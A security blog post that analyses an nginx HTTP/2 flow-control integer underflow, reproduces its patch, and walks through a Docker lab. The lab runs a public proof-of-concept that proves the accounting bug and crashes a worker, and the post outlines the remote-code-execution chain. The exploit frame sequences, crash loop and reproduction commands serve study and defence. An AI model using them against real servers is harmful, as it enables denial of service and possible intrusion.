---
title: "nginx2root: the 128 GB exploit and the six-line fix"
description: "Reconstructing the six-line nginx HTTP/2 flow-control fix for CVE-2026-123007, proving the accounting bug, crashing a worker at ~60 GiB, and measuring the 128 GB RCE path."
pubDate: 2026-11-19
tags: ["security", "nginx", "cve", "http2", "exploitability"]
draft: false
image: "/assets/images/post-nginx2root.jpg"
---

CVE-2026-123007 is a 64-bit integer underflow in nginx's HTTP/2 connection flow control. The fix is six lines. We reproduced the accounting bug with a few megabytes and the crash with about 60 GiB. The full RCE needs about 128 GB of traffic, and the reason is arithmetic, not bandwidth: a 64-bit window fed by 31-bit increments. We did not run the RCE. The public strategy needs glibc's AVX-512 copy routine, and our test host is a Haswell Xeon.

The short version:

- Vulnerable: nginx 1.9.5 through 1.31.8. Fixed: 1.31.9 and 1.30.7.
- The bug is in `ngx_http_v2_filter_cleanup()`, `ngx_http_v2_state_window_update()`, and `ngx_http_v2_send_chain()`.
- A client can make cleanup refund more connection credit than the connection ever had, push the counter past `2^31-1`, and then walk it past `2^63`.
- At that point the counter becomes a negative `off_t`, nginx builds a buffer whose end is before its start, and the TLS path passes a huge unsigned length to `memcpy`.
- A few megabytes proves the accounting failure. About 60 GiB walks the counter to the signed midpoint and crashes a worker. About 128 GB walks it far enough for the public RCE's bounded out-of-bounds copy.
- The patch keeps `send_window + send_queued <= NGX_HTTP_V2_MAX_WINDOW`, which is the invariant the old check assumed.

## The patch

Commit `e27f5fa84fe6`, "HTTP/2: account for queued frames when validating WINDOW_UPDATE". Six added lines, two changed:

```diff
--- a/src/http/v2/ngx_http_v2.h
+++ b/src/http/v2/ngx_http_v2.h
@@ -135,6 +135,7 @@ struct ngx_http_v2_connection_s {
     ngx_uint_t                       refused_streams;

     size_t                           send_window;
+    size_t                           send_queued;
     size_t                           recv_window;
     size_t                           init_window;
```

```diff
--- a/src/http/v2/ngx_http_v2.c
+++ b/src/http/v2/ngx_http_v2.c
@@ -2561,13 +2561,13 @@ ngx_http_v2_state_window_update(...)
-    if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window) {
+    if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window - h2c->send_queued) {
         ...
-                      window, h2c->send_window);
+                      window, h2c->send_window + h2c->send_queued);
         return ngx_http_v2_connection_error(h2c, NGX_HTTP_V2_FLOW_CTRL_ERROR);
     }
```

```diff
--- a/src/http/v2/ngx_http_v2_filter_module.c
+++ b/src/http/v2/ngx_http_v2_filter_module.c
@@ -1242,6 +1242,7 @@ ngx_http_v2_send_chain(...)
             ngx_http_v2_queue_frame(fn, frame);

             h2c->send_window -= frame_size;
+            h2c->send_queued += frame_size;

             stream->send_window -= frame_size;
             stream->queued++;
@@ -1634,6 +1635,7 @@ ngx_http_v2_data_frame_handler(...)
     h2c->payload_bytes += frame->length;
+    h2c->send_queued -= frame->length;

     ngx_http_v2_handle_frame(stream, frame);
@@ -1770,6 +1772,7 @@ ngx_http_v2_filter_cleanup(...)
     }

     h2c->send_window += window;
+    h2c->send_queued -= window;
 }
```

The commit message states the failure plainly:

> When a stream is terminated, its unsent payload length is refunded back to the connection flow control. Previously, this could increase the flow control beyond `NGX_HTTP_V2_MAX_WINDOW`, if it was increased by the client after the stream frames were queued and before the stream was terminated. This eventually resulted in broken buffer size control in `ngx_http_v2_send_chain()` followed by memory corruption and a possible segmentation fault.

`send_window` means "credit available after subtracting reserved bytes". `send_queued` means "credit reserved by a queued DATA frame but not yet consumed". From the client's perspective, both are still inside the window. Cleanup now refunds one and removes the other, so the sum doesn't grow.

The release's `src/http/v2` diff also limits the cleanup refund to DATA frames and clears the trailer `blocked` flag. Those changes keep `send_queued` consistent when headers and trailers share the queue. The commit above is the accounting change; the tag diff linked at the end has the rest.

## How the bug works

nginx tracks two windows. The per-stream window is signed, so `SETTINGS_INITIAL_WINDOW_SIZE` can legitimately leave a stream negative. The per-connection window is an unsigned `size_t` and is supposed to stay between zero and `NGX_HTTP_V2_MAX_WINDOW` (`2^31-1`).

**Queue and refund.** When nginx queues a DATA frame, it reserves the bytes:

```c
ngx_http_v2_queue_frame(h2c, frame);
h2c->send_window -= frame_size;
stream->send_window -= frame_size;
stream->queued++;
```

If the request is terminated while that frame is still queued and unstarted, cleanup returns the reserved bytes:

```c
if (frame->stream == stream && !frame->blocked) {
    *fn = frame->next;
    window += frame->length;
    ...
}
h2c->send_window += window;
```

The client can raise the connection credit to MAX while the DATA waits. Cleanup then adds the refund on top, producing `MAX + R`. That's the first invalid state.

To terminate the stream without killing the connection, the client puts a stream window at `MAX-1` and sends a `SETTINGS_INITIAL_WINDOW_SIZE` increase of 2. nginx resets that stream with `RST_STREAM`, cleanup runs, and the connection remains usable.

**Underflow.** The next connection `WINDOW_UPDATE` is checked like this:

```c
if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window) {
    return ngx_http_v2_connection_error(h2c, NGX_HTTP_V2_FLOW_CTRL_ERROR);
}
h2c->send_window += window;
```

With `send_window = MAX + R`, the right side is `-R`, which wraps to `2^64 - R` as an unsigned value. The check now accepts increments it should reject. Each frame grants at most `2^31-1`, so the client repeats until the counter is past `2^63`.

**Negative length.** `ngx_http_v2_send_chain()` casts the connection window to a signed `off_t`:

```c
if (limit == 0 || limit > (off_t) h2c->send_window) {
    limit = h2c->send_window;
}
...
if ((off_t) frame_size > limit) {
    frame_size = (size_t) limit;
}
...
if (rest) {
    cl = ngx_http_v2_filter_get_shadow(stream, in->buf, offset, rest);
}
```

A counter above `2^63` becomes a negative `limit`. The stream-window check only reduces a limit that is too large; it doesn't reject a negative one. The shadow buffer then does:

```c
chunk->pos += offset;
chunk->last = chunk->pos + size;
```

With a negative `size`, `last` ends up before `pos`. The response didn't get larger; its metadata is invalid.

**Huge copy.** The TLS send path computes the buffer length and only clamps values that are too large:

```c
size = in->buf->last - in->buf->pos;
if (size > buf->end - buf->last) {
    size = buf->end - buf->last;
}
if (send + size > limit) {
    size = (ssize_t) (limit - send);
}
ngx_memcpy(buf->last, in->buf->pos, size);
```

`memcpy` takes an unsigned `size_t`, so `-d` becomes `2^64 - d`. A copy that actually walked that range would fault. On the tested x86-64 glibc build, the EVEX/YMM routine computes its end address with 64-bit wraparound, so the backward loop stops after a bounded set of out-of-bounds loads and stores. That's how the public exploit gets a constrained read/write instead of an immediate crash. Other lengths, layouts, or copy routines fault.

## Why 128 GB

The connection window is 64 bits. `WINDOW_UPDATE` increments are 31 bits. You cannot jump; you have to send frames.

| Target | Frames | Payload |
|---|---:|---:|
| Past `2^63` (signed midpoint) | ~2^32 | 52 GiB |
| Near `2^64` (public RCE path) | ~2^33 | 104 GiB |
| Request-header carriers for nginx's flood accounting | — | ~15 GiB |
| Reported plaintext total | — | ~119.02 GiB |
| Wire after TLS and network overhead | — | ~128 GB |

Each frame is 13 bytes: a 9-byte HTTP/2 header and a 4-byte increment. `2^32 * 13` is 52 GiB; `2^33 * 13` is 104 GiB. The carriers exist because nginx limits control-frame traffic in proportion to parsed payload, so the client spends about 15 GiB on request headers to keep the `WINDOW_UPDATE` flood legal.

This is per connection. The window state doesn't move between connections, so you can't split one attempt across a botnet. Parallel connections can improve the odds of a good heap layout, but each one pays the full walk.

At 10 Gbit/s, 128 GB is about 102 seconds of wire time. At 1 Gbit/s it's about 17 minutes. At 300 Mbit/s it's about 57 minutes, and nginx's one-hour connection lifetime starts to matter. But the server also has to parse every frame, on one worker.

We measured that on a Haswell Xeon E5-2650 v3: the ~60 GiB crash run took 306 seconds, about 210 MB/s and 14 million `WINDOW_UPDATE` frames per second. At that rate the full `2^33`-frame walk is roughly 10 minutes, regardless of a 10 Gbit/s link. A modern CPU parsing closer to 50 million frames per second lands near Rapid7's 2.5 minutes. Wire time is a lower bound; frame parsing is often the real one.

## The lab

The target is the pinned `linux/amd64` image Rapid7 used:

```
nginx@sha256:5ab5b0b01097420873a3f3330f44248e34a3c2a3e8d5ee30658aeae8cb7435da
```

That's nginx 1.31.8. The fixed side is `nginx:1.31.9`. The config is ordinary: HTTP/2 on, TLS with a self-signed cert, static files.

```nginx
user nginx;
worker_processes 4;

events { worker_connections 1024; }

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65;

    server {
        listen 443 ssl;
        http2 on;
        server_name localhost;

        ssl_certificate /tmp/nginx-h2.crt;
        ssl_certificate_key /tmp/nginx-h2.key;

        root /usr/share/nginx/html;

        location / { try_files $uri $uri/ =404; }
    }
}
```

Clone the public trigger, then start both sides with the same config:

```sh
git clone --depth 1 https://github.com/sfewer-r7/CVE-2026-123007.git poc

for spec in \
  "nginx2root-vuln|nginx@sha256:5ab5b0b01097420873a3f3330f44248e34a3c2a3e8d5ee30658aeae8cb7435da|19443" \
  "nginx2root-fixed|nginx:1.31.9|19444"
do
  IFS='|' read -r name image port <<<"$spec"
  docker rm -f "$name" >/dev/null 2>&1 || true
  docker run -d --name "$name" --platform linux/amd64 \
    --security-opt apparmor=unconfined \
    -p "127.0.0.1:$port:443" \
    --mount type=bind,src="$PWD/nginx.conf",dst=/etc/nginx/nginx.conf,readonly \
    --entrypoint sh "$image" -c '
      openssl req -x509 -newkey rsa:2048 -nodes -days 30 \
        -keyout /tmp/nginx-h2.key -out /tmp/nginx-h2.crt \
        -subj /CN=localhost \
        -addext subjectAltName=DNS:localhost,IP:127.0.0.1 &&
      exec nginx -g "daemon off;"'
done
sleep 2
docker exec nginx2root-vuln nginx -v
docker exec nginx2root-fixed nginx -v
```

`--security-opt apparmor=unconfined` was necessary on our host. Docker's `docker-default` profile denied nginx's worker `socketpair()`:

```
apparmor="DENIED" operation="create" class="net" family="unix" sock_type="stream"
```

The master started and listened, but no workers came up. If your host doesn't hit that, the option is harmless.

### The accounting oracle

The public trigger is `simple-trigger-poc.py`. It first proves the accounting bug, then sends the 60 GiB crash amplifier. We cut it after the proof by replacing one line:

```python
print("cleanup over-credit confirmed; starting signed-window crash amplifier")
```

with

```python
print("cleanup over-credit confirmed; ORACLE_ONLY"); sys.exit(0)
```

The frames that matter are built directly, so the invalid state is visible on the wire. The helpers:

```python
def frame(kind, flags, stream, data=b""):
    return (len(data).to_bytes(3, "big") + bytes((kind, flags))
            + stream.to_bytes(4, "big") + data)

def update(stream, value):
    return frame(WINDOW_UPDATE, 0, stream, value.to_bytes(4, "big"))

def setting(value):
    return frame(SETTINGS, 0, 0, b"\0\4" + value.to_bytes(4, "big"))
```

The event sequence:

```python
event = (update(0, 1792) + update(0, MAX)
         + update(149, MAX - 1) + update(151, MAX - 1)
         + setting(2) + update(0, MAX) + setting(65535)
         + request(155, authority, extra=literal(RANGE, "bytes=0-9")))
```

Read it left to right:

1. `update(0, 1792)` grants credit for the two pending 896-byte responses.
2. `update(0, MAX)` takes the connection to the protocol maximum.
3. `update(149, MAX-1)` and `update(151, MAX-1)` put both stream windows just below the maximum.
4. `setting(2)` adds 2 to every stream window, so both streams would exceed the maximum. nginx resets them; cleanup refunds their queued DATA and pushes the connection above the maximum.
5. `update(0, MAX)` is the frame that should be rejected. With the underflowed check, it's accepted.
6. `setting(65535)` restores the initial window.

The script then sends a PING and requires an ACK on the same connection. That proves nginx didn't just delay an error or close the connection; it accepted frames after the invalid state.

The client needs CPython 3.10 with OpenSSL 3 because it uses a `ctypes` bridge to force TLS 1.3 `KeyUpdate` messages. It appends 262,144 KeyUpdates to the 7 MiB carrier, which forces nginx to consume the prepared input before decrypting the next record. That gives the trigger a deterministic parser/output boundary.

Generate the oracle-only copy, then run it against both builds:

```sh
sed 's/^    print("cleanup over-credit confirmed.*$/    print("cleanup over-credit confirmed; ORACLE_ONLY"); sys.exit(0)/' \
  poc/simple-trigger-poc.py > oracle-only.py
grep -q ORACLE_ONLY oracle-only.py

docker run --rm --network host -v "$PWD:/work" python:3.10-slim-bookworm \
  python3 -u /work/oracle-only.py https://127.0.0.1:19443/
docker run --rm --network host -v "$PWD:/work" python:3.10-slim-bookworm \
  python3 -u /work/oracle-only.py https://127.0.0.1:19444/
```

Results:

| Build | Output | Time |
|---|---|---|
| 1.31.8 | `cleanup over-credit confirmed; ORACLE_ONLY` | 52 s |
| 1.31.9 | `target did not reset both over-credited streams: {}` | 32 s |

The patched server rejects the invalid flow-control state instead of resetting the streams and carrying on. That's the fix, observed on the wire.

### The crash

The crash amplifier walks the counter to the signed midpoint. It sends 128 tranches of 32 batches, one million 13-byte `WINDOW_UPDATE` frames per batch:

```python
maximum = update(0, MAX)
batch = maximum * (1 << 20)
for tranche in range(128):
    for _ in range(32):
        send(batch)
    if tranche != 127:
        next_sink = sink + 2
        send(reset(sink) + request(next_sink, authority,
                                   extra=one_byte_range))
        sink = next_sink
```

`128 * 32 * 2^20` is `2^32` frames, 52 GiB. The 512 maximum-size, header-empty HEAD requests before the loop add about 8 GiB and satisfy nginx's flood accounting. Rotating one-byte Range owners keeps DATA from being released while the connection window is negative, and keeps each owner from waiting for the send timeout.

The final `update(sink, 1)` grants one byte to the last Range stream. The negative connection limit produces the inverted buffer, and the TLS `memcpy` takes the fatal path.

Run it against a freshly restarted vulnerable container:

```sh
docker restart nginx2root-vuln
started=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker run --rm --network host -v "$PWD/poc:/poc" python:3.10-slim-bookworm \
  python3 -u /poc/simple-trigger-poc.py https://127.0.0.1:19443/
docker logs --since "$started" nginx2root-vuln 2>&1 \
  | grep -E 'worker process [0-9]+ exited on signal 11'
```

Our output:

```
cleanup over-credit confirmed; starting signed-window crash amplifier
Nginx worker crashed in the signed-window memcpy consumer
```

and, independently, from the nginx log:

```
2026/11/19 12:23:53 [alert] 1#1: worker process 8 exited on signal 11
```

Wall time: 306 seconds. Traffic: about 60 GiB. The client's disconnect message alone isn't proof; the signal-11 line is. Both were present.

## Crash vs RCE

The crash needs no AVX-512, no heap profile, and no fresh heap beyond restarting the container. It needs ~60 GiB and a direct connection. On a 1 Gbit/s path that's about eight minutes. It's a denial-of-service primitive, and a service that restarts workers can be kept in a crash loop.

The RCE is a different amount of work. The public strategy:

1. Leak heap, nginx, and libc addresses from the memory before the response body. The PoC captured 14,393 bytes.
2. Resolve `system()` in libc despite ASLR.
3. Place attacker-controlled request bytes in the heap, groom the layout, and overwrite a request-pool cleanup callback.
4. Release the final response byte so nginx calls the callback.

It needs a fresh worker heap, 16 auxiliary connections, response owners of about 1.08 GiB inside the 60-second send timeout, and the whole connection inside the one-hour lifetime. The PoC's own README says it will likely fail with concurrent clients, a messy heap, insufficient bandwidth, or a proxying intermediary. It is a profile for one pinned Debian/nginx build, not a universal exploit.

**Is AVX-512 required?** Not for the bug, and not for the crash. The published RCE chain expects it: the server's CPU matters because glibc picks the `memcpy` routine there, and the chain is calibrated to the EVEX/YMM implementation. The huge copy would fault if it walked the requested range. That routine computes its end address with 64-bit wraparound — the requested length is `2^64 - d`, so `D + n - 129` wraps to an address just below the start — and the backward loop stops after a bounded set of out-of-bounds accesses. The call returns, and the exploit continues with a read/write primitive.

We tried to isolate that with a synthetic probe under Intel SDE: `memcpy(dst, src, 2^64 - 4096)`, both buffers mapped, with a 64 KiB gap between them, then a scan for changed bytes.

```c
size_t n = (size_t)0 - 4096;          /* 2^64 - 4096 */
size_t len = 32 << 20;
unsigned char *base = mmap(NULL, len, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
unsigned char *dst = base + (16 << 20);
unsigned char *src = dst - 65536;
unsigned char *before = malloc(len);

memset(base, 0x41, len);
memset(src, 0x42, 65536);
memset(dst, 0x43, 65536);
memcpy(before, base, len);

void *(*volatile real)(void *, const void *, size_t) = memcpy;
real(dst, src, n);

for (size_t i = 0; i < len; i++) {
    if (base[i] != before[i]) {
        printf("%zd\n", (ssize_t)i - (ssize_t)(dst - base));
    }
}
```

The real run installs a SIGSEGV handler so a fault is reported instead of killing the probe.

| CPU | Changed bytes | First change (from `dst`) |
|---|---:|---:|
| native Haswell | 288 | `dst - 4256` |
| SDE `-hsw` | 288 | `dst - 4256` |
| SDE `-icx` | 288 | `dst - 4256` |
| SDE `-spr` | 576 | `dst - 4416` |

The wrap is not unique to AVX-512. The native AVX2 routine also returned with a bounded OOB in this test; what changed was the routine width and offset. `-icx` matched the native 32-byte behavior; `-spr` used 64-byte vectors. That fits Rapid7's wording: the chain is calibrated to a specific EVEX/YMM implementation, and its setup calls the CPU checks compatibility checks, not proof that glibc selected that routine. So the requirement is about the exact routine and heap layout the published chain was built for, not a simple “AVX-512 returns, AVX2 faults” switch. Alternative strategies may exist; none are public.

The crash trigger stops at the signed midpoint, where the endpoint is non-canonical, so it takes the fatal path on any copy routine. That's why our Haswell host can prove the crash but not the RCE. We didn't run the 128 GB chain under SDE; the slowdown and the one-hour connection limit make it impractical.

We didn't run it. The test host is Haswell, so the EVEX path isn't available, and the 128 GB walk plus the heap work wouldn't prove anything the crash doesn't already prove about the memory bug.

## Real-world scenarios

**Targeted RCE is plausible where the attacker has a direct 10 Gbit/s path and a fresh worker.** That's a narrow set: exposed containers, freshly deployed appliances, and packaged products where many customers run the same image and configuration. The build-specific profile is the limiting factor.

**Mass exploitation is unlikely in the short term.** 128 GB per attempt, a heap layout that has to match, and HTTP/2-terminating CDNs or WAFs that re-originate the protocol all get in the way. Scanning for the version is cheap; converting it is not.

**Denial of service is the practical mass impact.** 60 GiB per worker crash is expensive but not prohibitive, and it needs none of the heap work.

**HTTP/2 is the gate.** Servers with HTTP/2 disabled aren't reachable through this bug. Proxies that terminate HTTP/2 and open a new HTTP/2 connection upstream break the attacker's frame sequence; proxies that pass HTTP/2 through don't.

This is one of five critical RCEs in the same release. CVE-2026-123633 is an HTTP/2 use-after-free with different conditions: it needs a reverse-proxy setup and connection-slot pressure. The others are an HTTP/3 UAF, a resolver UAF, and a mail-proxy UAF. The release also fixes several smaller issues.

## If you run nginx

- Update to 1.31.9 or 1.30.7. For nginx Plus, apply the matching fixed release from the F5 advisory.
- If you can't update, turn HTTP/2 off. In 1.25.1 and later, set `http2 off;` in the server blocks and remove the `http2` parameter from `listen`. Reload, and confirm the old workers exited.
- Inventory HTTP/2 listeners, including containers and bundled ingress images. A version scan is cheap; the hard part is the long-lived connection and the frame volume.
- A CDN or WAF that terminates HTTP/2 reduces exposure, but check whether it re-originates HTTP/2 to your nginx. If it does, the frames arrive unchanged.
- Watch for long-lived HTTP/2 connections with an extreme control-to-data ratio, especially billions of `WINDOW_UPDATE` frames, and for worker exits on SIGSEGV. These are general signs, not unique indicators.

## Reproduce it

The commands above are the whole recipe: save `nginx.conf`, clone the public trigger, start both containers, generate `oracle-only.py`, then run the oracle and the crash. The public PoC is at https://github.com/sfewer-r7/CVE-2026-123007, with Rapid7's write-up at the link below.

Expected oracle results: 1.31.8 prints `ORACLE_ONLY` and exits 0 in about a minute; 1.31.9 raises `target did not reset both over-credited streams` and exits non-zero. Expected crash: the client prints both lines and nginx logs `worker process ... exited on signal 11`.

## Sources

- nginx security advisories: https://nginx.org/en/security_advisories.html
- Rapid7 analysis: https://www.rapid7.com/blog/post/ve-cve-2026-123007-critical-nginx-http-2-integer-underflow-leads-to-rce-fixed/
- Public PoC: https://github.com/sfewer-r7/CVE-2026-123007
- F5 advisory: https://my.f5.com/manage/s/article/K000163926
- Wiz analysis: https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities
- Fix commit: https://github.com/nginx/nginx/commit/e27f5fa84fe6
- Tag diff: https://github.com/nginx/nginx/compare/release-1.31.8...release-1.31.9
